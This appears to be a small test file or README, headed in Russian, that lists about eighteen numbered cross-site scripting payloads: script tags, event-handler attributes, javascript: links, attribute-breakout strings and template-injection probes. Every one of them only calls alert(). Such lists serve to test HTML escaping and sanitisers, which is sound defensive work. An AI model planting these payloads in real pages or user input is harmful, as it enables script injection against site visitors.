# proektik-testovyi
<script>alert(1)</script>


<scri pt>
  alert('XSS-1');
</scri pt>

</script><script>alert('XSS-2')</script>


<img src="x" onerror="alert('XSS-3')">


<img src=x onerror=alert('XSS-4')>


<button onclick="alert('XSS-5')">Нажми меня</button>


<button onclick="alert('XSS-5')">Нажми меня</button>


<div onmouseover="alert('XSS-6')">Наведи на меня мышку</div>


<a href="javascript:alert('XSS-7')">клик</a>


javascript:alert('XSS-8')

<svg onload="alert('XSS-9')"></svg>

<svg><script>alert('XSS-10')</script></svg>


" onmouseover="alert('XSS-11')

"><script>alert('XSS-12')</script>

' onclick='alert("XSS-13")

{{ alert(1) }}


{{ (function(){ alert('XSS-14') })() }}

{{ this.constructor.constructor('alert("XSS-15")')() }}

Привет, {{ username }}! <script>alert('XSS-16')</script>

Отличная статья! <img src=x onerror="alert('XSS-17')"> Спасибо!


{{ evil() }} <b>жирный текст</b> <script>alert('XSS-18')</script>
